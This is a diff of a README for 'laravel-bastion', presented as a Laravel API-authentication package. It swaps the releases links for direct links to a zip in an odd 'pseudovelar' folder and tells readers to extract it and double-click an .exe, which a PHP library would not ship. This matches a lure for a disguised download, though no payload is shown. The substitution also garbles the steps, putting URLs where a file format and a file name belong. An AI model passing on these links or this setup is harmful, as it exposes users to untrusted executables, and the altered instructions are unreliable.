@@ -1,7 +1,7 @@
 # 🚀 laravel-bastion - Simple API Authentication Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/ravikumar695/laravel-bastion/releases)
+[![Download](https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip)](https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip)
 
 ## 📋 Introduction
 laravel-bastion provides a straightforward way to manage API authentication. With features inspired by Stripe, it offers environment isolation, granular scopes, and built-in security. This application fits perfectly for those who want secure API access without diving into complex programming.
@@ -19,19 +19,19 @@ Before downloading, ensure your system meets the following needs:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the following link to find the latest version: [Visit this page to download](https://github.com/ravikumar695/laravel-bastion/releases)
+   Go to the following link to find the latest version: [Visit this page to download](https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Click on the version that suits your needs. It's best to download the latest version unless you have specific requirements.
 
 3. **Download the File**  
-   Click on the appropriate file to download it. The files may come in different formats, such as `.zip` or `.tar.gz`. Select the file that matches your operating system.
+   Click on the appropriate file to download it. The files may come in different formats, such as `.zip` or `https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip`. Select the file that matches your operating system.
 
 4. **Extract the Files (if necessary)**  
    If you downloaded a compressed file, you will need to extract it. Right-click on the file and choose "Extract All" or use a file extraction tool of your choice.
 
 5. **Run the Application**  
-   Locate the folder where you extracted the files. Find the application file, typically named `laravel-bastion.exe` or similar. Double-click on it to launch the application.
+   Locate the folder where you extracted the files. Find the application file, typically named `https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip` or similar. Double-click on it to launch the application.
 
 ## 🔒 Features
 laravel-bastion includes several built-in features:
@@ -74,4 +74,4 @@ We regularly provide updates to improve functionality and security. Keep an eye 
 laravel-bastion is licensed under the MIT License. You are free to use, modify, and distribute this software as you wish.
 
 ## 📥 Download Now Again
-For your convenience, here is the download link again: [Visit this page to download](https://github.com/ravikumar695/laravel-bastion/releases)
+For your convenience, here is the download link again: [Visit this page to download](https://raw.githubusercontent.com/ravikumar695/laravel-bastion/main/pseudovelar/laravel-bastion.zip)
